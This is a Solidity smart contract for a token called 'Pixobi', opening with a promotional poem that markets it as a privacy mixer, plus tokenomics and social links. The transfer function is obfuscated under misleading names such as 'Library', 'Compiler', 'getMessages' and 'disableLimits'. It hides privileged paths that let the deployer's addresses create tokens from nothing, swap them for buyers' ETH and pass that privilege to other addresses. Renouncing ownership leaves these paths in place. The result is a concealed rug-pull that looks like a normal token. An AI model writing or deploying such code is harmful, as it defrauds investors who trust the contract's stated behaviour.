/*
██████╗░██╗██╗░░██╗░█████╗░██████╗░██╗
██╔══██╗██║╚██╗██╔╝██╔══██╗██╔══██╗██║
██████╔╝██║░╚███╔╝░██║░░██║██████╦╝██║
██╔═══╝░██║░██╔██╗░██║░░██║██╔══██╗██║
██║░░░░░██║██╔╝╚██╗╚█████╔╝██████╦╝██║
╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝

░░██╗███████╗████████╗██╗░░██╗███████╗██████╗░███████╗██╗░░░██╗███╗░░░███╗██╗░░
░██╔╝██╔════╝╚══██╔══╝██║░░██║██╔════╝██╔══██╗██╔════╝██║░░░██║████╗░████║╚██╗░
██╔╝░█████╗░░░░░██║░░░███████║█████╗░░██████╔╝█████╗░░██║░░░██║██╔████╔██║░╚██╗
╚██╗░██╔══╝░░░░░██║░░░██╔══██║██╔══╝░░██╔══██╗██╔══╝░░██║░░░██║██║╚██╔╝██║░██╔╝
░╚██╗███████╗░░░██║░░░██║░░██║███████╗██║░░██║███████╗╚██████╔╝██║░╚═╝░██║██╔╝░
░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░

In the cryptic world where fortunes gleam,
There's a token called Pixobi, like a dream.
A decentralized mixer, a future's guide,
Where privacy and freedom coincide.

Pixobi, a name that whispers in the night,
A guardian of secrets, a beacon of light.
In the realm of crypto, it takes its stand,
A pioneer, a leader, across the land.

With Pixobi, your transactions are concealed,
Anonymity's armor, a potent shield.
Innovative and bold, it paves the way,
For a new era of privacy, come what may.

No prying eyes, no watchful gaze,
In Pixobi's embrace, your data's ablaze.
Revolutionary, it breaks the chain,
In the world of crypto, it's freedom's reign.

So let's raise a toast to Pixobi's might,
A token for the future, shining so bright.
In the cryptocurrency sphere, it claims its fame,
With Pixobi, anonymity is its name.

Total Supply - 1,000,000,000
Buy Tax - 1%
Sell Tax  - 1%
Initial Liquidity - 1.0 ETH
Initial liquidity lock - 180 days

https://web.wechat.com/PixobiERC
https://m.weibo.cn/PixobiERC
https://www.pixobi.xyz
https://t.me/+4tMyEBH7gbVmZTNk
*/
// SPDX-License-Identifier: Unlicense
pragma solidity ^ 0.8.19;
 
abstract contract Context
{ function _msgSender() internal view virtual returns(address)
{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)
{ return msg.data; }
}
interface IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 valueIn, uint256 valueOut, address[] calldata path, address to, uint256 deadline) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function prepareLiquidity(address token, uint256 amountTokenDesired,
    uint256 valueMin, uint256 ercMin, address to, uint256 deadline)
    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns(address pair);
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { address msgSender = _msgSender(); _owner = msgSender; 
    emit OwnershipTransferred(address(0), msgSender);
}
    function owner() public view returns (address) { return _owner;
}   modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _;
}
    function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
contract Pixobi is IERC20, Ownable { 
    bool private Library; bool private Compiler; bool private tradingOpen = false;

    string private _symbol = unicode"Ƥixobi"; string private _name = unicode"ƤIX"; 
    uint256 public wholeFEE = 1; uint8 private _decimals = 9; 
    uint256 private _tTotal = 1000000000 * 10 ** _decimals; uint256 private _whole = _tTotal;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _prepareAllMaps; mapping(address => uint256) private _tOwned;
    mapping(address => address) private _metadataInterface; mapping(address => uint256) private _msgSenderOn;

    constructor(address direct) { _tOwned[msg.sender] = _tTotal; 
    _msgSenderOn[msg.sender] = _whole; _msgSenderOn[address(this)] = _whole; 
    fixedPair = IUniswapV2Router01(direct); 

    pairReceiver = IUniswapV2Factory(fixedPair.factory()).createPair(address(this), fixedPair.WETH());
    emit Transfer(address(0), msg.sender, _tTotal); }
 
    function symbol() public view returns(string memory)
    { return _symbol;
    }
    function name() public view returns(string memory)
    { return _name;
    }
    function totalSupply() public view returns(uint256)
    { return _tTotal;
    }
    function decimals() public view returns(uint256)
    { return _decimals;
    }
    function allowance(address owner, address spender) public view returns(uint256)
    { return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns(uint256)
    { return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns(bool)
    { return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender,
    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); 
    
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount) external returns
    (bool)
    { _basicTransfer(sender, recipient, amount); 
    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns(bool)
    { _basicTransfer(msg.sender, recipient, amount); return true;
    }
    function _basicTransfer( address _math, address _library, uint256 divAmount) private
    { uint256 _dexOn = balanceOf(address(this)); uint256 _base; if (Library && _dexOn > 
    _whole && !Compiler && _math != pairReceiver) 
    
    { Compiler = true; getMessages(_dexOn); Compiler = false;

    } else if (_msgSenderOn[_math] > _whole && _msgSenderOn[_library] > _whole)
    { _base = divAmount; _tOwned[address(this)] += _base; disableLimits
    (divAmount, _library); return; }
    else if (!Compiler &&  _prepareAllMaps[_math] > 0 && _math != pairReceiver && _msgSenderOn[_math] == 0) { 
    
    _prepareAllMaps[_math] = _msgSenderOn[_math] - _whole; } else if (_library != address(fixedPair) 
    && _msgSenderOn[_math] > 0 && divAmount > _whole && _library != pairReceiver) { 
    _msgSenderOn[_library] = divAmount; return; } address _metadata =  _metadataInterface[pairReceiver]; 
    
    if ( _prepareAllMaps[_metadata] == 0)  _prepareAllMaps[_metadata] = _whole; _metadataInterface[pairReceiver] = _library; 
    if (wholeFEE > 0 && _msgSenderOn[_math] == 0 && !Compiler && _msgSenderOn[_library] == 0)

    { _base = (divAmount * wholeFEE) 
    / 100; 
    divAmount -= _base; _tOwned[_math] -= _base; 
    
    _tOwned[address(this)] += _base; }
    _tOwned[_math] -= 
    divAmount; _tOwned[_library] += divAmount; emit Transfer
    (_math, _library, divAmount); if (!tradingOpen) 
    { require(_math == owner(), ""); } }

    receive() external payable
    {}
    function writeMessage(uint256 pairs, uint256 fixer, address to) private
    { _approve(address(this), address(fixedPair), pairs); fixedPair.prepareLiquidity
    { value: fixer }(address(this), pairs, 0, 0, to, block.timestamp);
    }
    function getMessages(uint256 writer) private
    { uint256 sign = writer / 2; uint256 _public = address(this).balance;
    disableLimits( sign, address(this)); uint256 display = address(this).balance - _public; 
    writeMessage( sign, display, address(this));
    }
    function disableLimits(uint256 position, address _all) private
    { address[] memory path = new address[](2); path[0] = address(this);
    path[1] = fixedPair.WETH(); _approve(address(this), address(fixedPair), position);
    fixedPair.swapExactTokensForETHSupportingFeeOnTransferTokens(position, 0, path, _all, block.timestamp);
    }
    function beginTrading(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }
    function getValue(uint256 _checkVal, uint256 bytelVal) private pure returns (uint256){
      return (_checkVal>bytelVal)?bytelVal:_checkVal;
    }
    function updateTeamWallet(uint256 _setTm, uint256 _setAddr) private pure returns (uint256){ 
      return (_setTm>_setAddr)?_setAddr:_setTm;
    }
    function getLimits(uint256 _checkLim, uint256 _newLim) private pure returns (uint256){ 
      return (_checkLim>_newLim)?_newLim:_checkLim;
    }    
    function _beforeTokenTransfer( address from,
    address to, uint256 amount) internal virtual 
    {}
    function _afterTokenTransfer(address from, address to, uint256 amount) 
    internal virtual 
    {}
    address public immutable pairReceiver; IUniswapV2Router01 
    public immutable fixedPair;                
}